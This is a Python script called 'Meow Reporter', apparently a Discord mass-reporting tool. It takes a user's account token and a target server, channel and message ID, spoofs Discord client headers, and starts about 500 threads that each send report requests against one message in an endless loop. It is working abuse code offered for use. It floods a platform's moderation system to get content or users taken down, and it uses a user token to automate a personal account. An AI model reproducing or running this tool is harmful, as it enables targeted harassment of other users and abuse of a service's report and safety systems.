
import requests
import colorama
import threading
import os
import ctypes
from colorama import Fore, Style
from threading import Thread
from sys import stdout
from requests import Session
from time import strftime, gmtime

sent = 0
session = Session()
b = Style.BRIGHT
os = os.system
os('cls')

ctypes.windll.kernel32.SetConsoleTitleW(f"Meow Reporter")

print(f"""

{b+Fore.BLUE}  
                                                                                                                   
                                                                                              d8P                  
                                                                                           d888888P                
  88bd8b,d88b  d8888b d8888b  ?88   d8P  d8P      88bd88b d8888b?88,.d88b, d8888b   88bd88b  ?88'   d8888b  88bd88b
  88P'`?8P'?8bd8b_,dPd8P' ?88 d88  d8P' d8P'      88P'  `d8b_,dP`?88'  ?88d8P' ?88  88P'  `  88P   d8b_,dP  88P'  `
 d88  d88  88P88b    88b  d88 ?8b ,88b ,88'      d88     88b      88b  d8P88b  d88 d88       88b   88b     d88     
d88' d88'  88b`?888P'`?8888P' `?888P'888P'      d88'     `?888P'  888888P'`?8888P'd88'       `?8b  `?888P'd88'     
                                                                  88P'                                             
                                                                 d88                                               
                                                                 ?8P                                                                             

PS: sois admin poto sinon tu pense bien ca va pas marcher <3

{b+Fore.BLUE} > {Fore.RESET}Creator: *****

{b+Fore.BLUE} > {Fore.RESET}Options

{b+Fore.BLUE} > {Fore.RESET}illegal Conent {b+Fore.BLUE}::{Fore.RESET} 1
{b+Fore.BLUE} > {Fore.RESET}Harrassment {b+Fore.BLUE}::{Fore.RESET} 2
{b+Fore.BLUE} > {Fore.RESET}Spam or Phishing Links {b+Fore.BLUE}::{Fore.RESET} 3
{b+Fore.BLUE} > {Fore.RESET}Self harm {b+Fore.BLUE}::{Fore.RESET} 4
{b+Fore.BLUE} > {Fore.RESET}NSFW Content {b+Fore.BLUE}::{Fore.RESET} 5
""")

token = input(f"{b+Fore.BLUE} > Token{Fore.RESET}: ")
headers = {'Authorization': token, 'Content-Type':  'application/json'}  
r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
if r.status_code == 200:
        pass
else:
        print(f"{b+Fore.RED} > Invalid Token")
        input()
guild_id1 = input(f"{b+Fore.BLUE} > Server ID{Fore.RESET}: ")
channel_id1 = input(f"{b+Fore.BLUE} > Channel ID{Fore.RESET}: ")
message_id1 = input(f"{b+Fore.BLUE} > Message ID{Fore.RESET}: ")
reason1 = input(f"{b+Fore.BLUE} > Option{Fore.RESET}: ")


def Main():
  global sent
  headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
        'Authorization': token,
        'Content-Type': 'application/json'
      }

  payload = {
    'channel_id': channel_id1,
    'guild_id': guild_id1,
    'message_id': message_id1,
    'reason': reason1
  }

  while True:
    r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
    if r.status_code == 201:
      print(f"{Fore.GREEN} > Sent Report {b+Fore.BLUE}::{Fore.GREEN} ID {message_id1}")
      ctypes.windll.kernel32.SetConsoleTitleW(f"[Meow] By FauZa | Sent: %s" % sent)
      sent += 1
      
    elif r.status_code == 401:
      print(f"{Fore.RED} > Invalid token")
      input()
      exit()
    else:
      print(f"{Fore.RED} > Error")


print()
for i in range(500, 1000):
    Thread(target=Main).start()